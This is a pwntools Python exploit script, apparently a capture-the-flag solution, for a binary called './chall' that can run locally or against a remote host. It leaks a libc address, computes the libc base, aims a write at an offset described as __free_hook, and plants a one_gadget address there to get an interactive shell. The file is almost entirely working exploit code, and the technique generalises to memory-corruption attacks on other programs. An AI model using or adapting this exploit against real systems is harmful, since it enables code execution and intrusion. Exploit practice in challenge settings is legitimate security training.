from pwn import * 

context.arch="x86_64"

def main():

    local = True 
    HOST = ""
    PORT = 0
    size = 200000
    offset_to_free_hook = 304683

    if local:

        p = process("./chall")

    else:
        p = remote(HOST, PORT) 


    p.sendlineafter("much: ", str(size))
    p.recvuntil("at: ")
    leak = p.recvline().rstrip()
    leak = int(leak, 16)
    log.info(f"Libc leak: {hex(leak)}")
    libc_base = leak + 0x5eff0
    
    log.info(f"Libc base: {hex(libc_base)}")

    one_gadget = libc_base + 0xeecd2

    p.sendlineafter("?: ", str(offset_to_free_hook))

    payload = "0" * (1024 - len(str(one_gadget))) + str(one_gadget)

    p.sendlineafter("Content: ", payload)
    p.interactive()


if __name__ == "__main__":

    main()

#0x7ffff7dc8010